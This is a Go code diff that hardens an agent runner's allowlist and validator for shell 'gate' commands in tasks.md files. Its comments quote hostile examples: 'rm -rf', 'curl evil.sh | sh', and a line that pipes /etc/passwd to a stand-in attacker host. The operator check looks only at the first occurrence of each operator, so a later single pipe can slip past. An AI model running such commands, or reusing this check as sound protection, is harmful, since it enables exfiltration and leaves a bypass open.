@@ -77,26 +77,42 @@ var allowedAgentCommands = map[string]struct{}{
 // allowedGateBinaries is the closed set of binaries that tasks.md may invoke
 // as a "gate" command. Combined with `validateGateCommand` it prevents a
 // malicious or naive spec from running `rm -rf` or `curl evil.sh | sh`.
+//
+// Read-only / no-side-effect commands (`echo`, `printf`, `true`, `false`,
+// `pwd`, `cat`, `head`, `tail`, `wc`) are intentionally included because
+// they're harmless and real-world tasks.md files use them as smoke
+// checks. Anything that can mutate state outside the project directory
+// (`rm`, `mv`, `cp`, `curl`, `wget`, `dd`, `chmod`, …) is excluded.
 var allowedGateBinaries = map[string]struct{}{
-	"node":   {},
-	"npm":    {},
-	"pnpm":   {},
-	"yarn":   {},
-	"bun":    {},
-	"deno":   {},
-	"go":     {},
-	"make":   {},
-	"pytest": {},
-	"python": {},
-	"python3": {},
-	"pip":    {},
-	"cargo":  {},
-	"rustc":  {},
-	"jest":   {},
-	"vitest": {},
-	"tsc":    {},
-	"eslint": {},
+	"node":       {},
+	"npm":        {},
+	"pnpm":       {},
+	"yarn":       {},
+	"bun":        {},
+	"deno":       {},
+	"go":         {},
+	"make":       {},
+	"pytest":     {},
+	"python":     {},
+	"python3":    {},
+	"pip":        {},
+	"cargo":      {},
+	"rustc":      {},
+	"jest":       {},
+	"vitest":     {},
+	"tsc":        {},
+	"eslint":     {},
 	"shellcheck": {},
+	// Read-only / no-side-effect commands.
+	"echo":   {},
+	"printf": {},
+	"true":   {},
+	"false":  {},
+	"pwd":    {},
+	"cat":    {},
+	"head":   {},
+	"tail":   {},
+	"wc":     {},
 }
 
 // NewAgentRunner creates a new agent runner. It validates the configured
@@ -124,27 +140,59 @@ func NewAgentRunner(cfg AgentConfig) (*AgentRunner, error) {
 	return &AgentRunner{config: cfg}, nil
 }
 
-// validateGateCommand checks that every executable token in a tasks.md gate
-// command resolves to a binary in `allowedGateBinaries`. It splits on `&&`,
-// `||`, `;`, `|`, and whitespace so compound shell expressions like
-// `npm test && go test` are fully validated.
+// validateGateCommand checks that every binary invoked by a tasks.md gate
+// resolves to a name in `allowedGateBinaries`. For compound expressions
+// like `npm test && go test`, EACH binary (npm, go) is validated against
+// the allowlist. Pipes (`|`), redirects (`<`, `>`), and command separators
+// (`;`, single `&`) are rejected outright because they can smuggle
+// exfiltration or destructive side effects past the allowlist (e.g.
+// `cat /etc/passwd | curl evil.sh`).
 func validateGateCommand(gate string) error {
 	gate = strings.TrimSpace(gate)
 	if gate == "" {
 		return nil
 	}
-	// Split on shell metacharacters so each side is validated independently.
-	// We don't parse quoting/escaping — gate syntax should be simple.
-	parts := splitShellTokens(gate)
-	if len(parts) == 0 {
-		return nil
-	}
-	for _, part := range parts {
-		// Skip shell operators and common flags/env-var prefixes.
-		if isShellOperator(part) || strings.HasPrefix(part, "-") || strings.Contains(part, "=") {
+	// Reject any of the dangerous operators outright.
+	for _, op := range []string{"|", "<", ">", ";", "&"} {
+		// `&` alone (not `&&`) is also rejected; the && / || forms are
+		// safe, so we let them through and split on them below.
+		idx := strings.Index(gate, op)
+		if idx < 0 {
 			continue
 		}
-		base := part
+		// Allow `&&` (which contains a single `&` followed by `&`).
+		if op == "&" && idx+1 < len(gate) && gate[idx+1] == '&' {
+			continue
+		}
+		// Allow `||` (which contains a single `|` followed by `|`).
+		if op == "|" && idx+1 < len(gate) && gate[idx+1] == '|' {
+			continue
+		}
+		return fmt.Errorf("gate contains forbidden operator %q; only && and || are allowed for compound expressions", op)
+	}
+	// Split into top-level expressions on && and ||, then validate each.
+	expressions := splitOnLogicalOps(gate)
+	for _, expr := range expressions {
+		expr = strings.TrimSpace(expr)
+		if expr == "" {
+			continue
+		}
+		parts := splitShellTokens(expr)
+		if len(parts) == 0 {
+			continue
+		}
+		var binary string
+		for _, part := range parts {
+			if part == "" || strings.HasPrefix(part, "-") || strings.Contains(part, "=") {
+				continue
+			}
+			binary = part
+			break
+		}
+		if binary == "" {
+			continue
+		}
+		base := binary
 		if idx := strings.LastIndexAny(base, "/\\"); idx >= 0 {
 			base = base[idx+1:]
 		}
@@ -156,6 +204,40 @@ func validateGateCommand(gate string) error {
 	return nil
 }
 
+// splitOnLogicalOps splits a string on `&&` and `||` only, leaving other
+// characters (including single `&` and `|`, which we've already rejected)
+// intact. Quotes are respected so `&&` inside a quoted string doesn't
+// trigger a split.
+func splitOnLogicalOps(s string) []string {
+	var parts []string
+	var current strings.Builder
+	inSingle, inDouble := false, false
+	runes := []rune(s)
+	for i := 0; i < len(runes); i++ {
+		r := runes[i]
+		switch {
+		case r == '\'' && !inDouble:
+			inSingle = !inSingle
+			current.WriteRune(r)
+		case r == '"' && !inSingle:
+			inDouble = !inDouble
+			current.WriteRune(r)
+		case !inSingle && !inDouble && r == '&' && i+1 < len(runes) && runes[i+1] == '&':
+			parts = append(parts, current.String())
+			current.Reset()
+			i++ // skip second &
+		case !inSingle && !inDouble && r == '|' && i+1 < len(runes) && runes[i+1] == '|':
+			parts = append(parts, current.String())
+			current.Reset()
+			i++ // skip second |
+		default:
+			current.WriteRune(r)
+		}
+	}
+	parts = append(parts, current.String())
+	return parts
+}
+
 func isShellOperator(s string) bool {
 	switch s {
 	case "&&", "||", "|", ";", "&", ">", ">>", "<", "<<", "(", ")":
@@ -165,16 +247,48 @@ func isShellOperator(s string) bool {
 }
 
 // splitShellTokens is a deliberately tiny shell tokenizer — just enough to
-// split compound commands. It does not handle quoting; gate authors should
-// keep gate commands simple.
+// split compound commands. It handles double and single quotes so a token
+// like `echo "build-ok"` doesn't get mis-parsed as a binary named
+// `"build-ok"`. It does NOT handle escapes (`\"` inside a quoted string) or
+// nested quotes; gate authors should keep gate commands simple.
 func splitShellTokens(cmd string) []string {
-	// Replace shell operators with spaces, then split on whitespace.
-	repl := strings.NewReplacer(
-		"&&", " ", "||", " ", "|", " ",
-		";", " ", ">", " ", "<", " ",
-		"(", " ", ")", " ",
-	)
-	return strings.Fields(repl.Replace(cmd))
+	var tokens []string
+	var current strings.Builder
+	inSingle, inDouble := false, false
+	flush := func() {
+		if current.Len() > 0 {
+			tokens = append(tokens, current.String())
+			current.Reset()
+		}
+	}
+	for _, r := range cmd {
+		switch {
+		case r == '\'' && !inDouble:
+			inSingle = !inSingle
+		case r == '"' && !inSingle:
+			inDouble = !inDouble
+		case (r == ' ' || r == '\t' || r == '\n') && !inSingle && !inDouble:
+			flush()
+		case (r == '&' || r == '|' || r == ';' || r == '>' || r == '<' || r == '(' || r == ')') && !inSingle && !inDouble:
+			flush()
+			tokens = append(tokens, string(r))
+		default:
+			current.WriteRune(r)
+		}
+	}
+	flush()
+	return tokens
+}
+
+// isShellOp reports whether s is a shell metacharacter that should be
+// ignored when tokenizing a gate command. Duplicated from internal/engine
+// (kept identical so a future refactor can extract to a shared package).
+func isShellOp(s string) bool {
+	switch s {
+	case "&&", "||", "|", ";", "&", ">", ">>", "<", "<<", "(", ")":
+		return true
+	}
+	return false
 }
 
 func sortedKeys(m map[string]struct{}) []string {
